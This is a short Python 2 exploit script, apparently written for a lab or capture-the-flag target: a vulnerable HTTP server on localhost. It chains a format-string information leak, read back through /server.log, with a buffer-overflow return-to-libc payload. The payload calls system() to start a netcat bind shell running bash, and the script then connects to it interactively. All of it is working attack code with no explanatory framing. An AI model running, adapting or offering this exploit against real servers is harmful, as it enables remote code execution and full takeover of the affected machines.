#!/usr/bin/env python

import sys
import socket
import urllib
import time
from struct import pack
from struct import unpack
from console import console

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])

def send(data, isRes):
	port = int(sys.argv[1])
	sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))
	sock.sendall(data)
	tmp = ''
	while True and isRes:
	    buf = sock.recv(1024)
	    if not buf:
	        break
	    tmp = buf
	sock.close()
	return tmp

n = 20
m = 2
addr = pack('<I', 0x0804b7e4)
send("GET "+addr+"%"+str(m)+"$08x%"+str(n)+"$s HTTP/1.0\r\n\r\n", False)
tmp = send("GET /server.log HTTP/1.0\r\n\r\n", True)
temp = tmp.split('\n')
lastLine = temp[len(temp)-2]

stack= int(lastLine[52:60], 16)+400
system = unpack('<I', lastLine[60:64])[0]-54272
exit = unpack('<I', lastLine[60:64])[0]-109776

p = ''
p += pack('<I', system) #system
p += pack('<I', exit) #exit
p += pack('<I', stack) #cmd
p += pack('<I', stack-100)
p += pack('<I', stack-100)
p += ' '*500
p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "+sys.argv[2]+" <&${p[0]} >&${p[1]}';   "

port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))

sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
time.sleep(5)

port = int(sys.argv[2])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))

console(sock)
